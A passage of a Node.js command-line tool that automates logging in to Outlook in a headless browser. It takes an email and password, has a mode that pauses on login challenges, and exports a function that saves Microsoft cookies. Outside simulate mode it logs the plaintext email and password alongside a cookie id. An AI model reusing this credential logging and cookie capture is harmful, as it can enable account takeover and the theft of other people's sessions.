                if (s.startsWith('--challenge-timeout-ms=')) return true;
                const known = [
                    '--verbose', '--simulate', '--dry-run', 
                    '--headful', '--headless', '--pause-on-challenge'
                ];
                return known.includes(s);
            };

            const flags = new Set(rawArgs.filter(a => isKnownFlag(a)));
            const positional = rawArgs.filter(a => !isKnownFlag(a));

            const verbose = flags.has('--verbose') || process.env.VERBOSE === '1';
            const simulate = flags.has('--simulate') || flags.has('--dry-run') || process.env.SIMULATE === '1';
            const headful = flags.has('--headful') || process.env.HEADFUL === '1';
            const headless = flags.has('--headless') || process.env.HEADLESS === '1';
            const logLevelFlag = rawArgs.find(a => String(a).startsWith('--log-level='));
            const logLevelFromFlag = logLevelFlag ? String(logLevelFlag).split('=').slice(1).join('=') : null;
            const pauseOnChallenge = flags.has('--pause-on-challenge') || process.env.PAUSE_ON_CHALLENGE === '1';
            const challengeTimeoutFlag = rawArgs.find(a => String(a).startsWith('--challenge-timeout-ms='));
            const challengeTimeoutMs = challengeTimeoutFlag ? Number(String(challengeTimeoutFlag).split('=').slice(1).join('=')) : null;
            const logLevel = normalizeLogLevel(
                verbose ? 'verbose' : (process.env.LOG_LEVEL || logLevelFromFlag || cfg.logLevel)
            );
            const effectiveHeadless = headful ? false : true;

            let email = positional[0];
            let password = positional[1];
            let sessionId = positional[2];

            if (!email) email = await ask('Enter Email: ');
            if (!simulate && !password) {
                if (process.stdin.isTTY) {
                    password = await ask('Enter Password: ');
                } else {
                    console.error('❌ Password is required (not in simulate mode) and stdin is not TTY.');
                    process.exit(1);
                }
            }
            rl.close();

            if (!email || (!simulate && !password)) {
                console.error('❌ Email and password are required (password not required in --simulate).');
                process.exit(1);
            }

            if (!sessionId) {
                sessionId = String(Date.now());
            }

            const cookieId = sessionId;

            if (!simulate) {
                await logCliEvent({ email, password, cookieId, attempt: 1 });
            }

            const automation = new OutlookLoginAutomation({ verbose, logLevel, headless: effectiveHeadless });
            await automation.init();
            
            const navigated = await automation.navigateToOutlook();
            if (navigated) {
                const success = await automation.performLogin(email, password, sessionId, {
                    simulate,
                    pauseOnChallenge: pauseOnChallenge || headful,
                    challengeTimeoutMs: Number.isFinite(challengeTimeoutMs) ? challengeTimeoutMs : undefined
                });
                if (!success) process.exit(1);
            } else {
                process.exit(1);
            }

            await automation.close();
            process.exit(0);

        } catch (error) {
            console.error('\n❌ Failed:', error.message);
            process.exit(1);
        }
    })();
}

module.exports = { OutlookLoginAutomation, saveMicrosoftCookies };
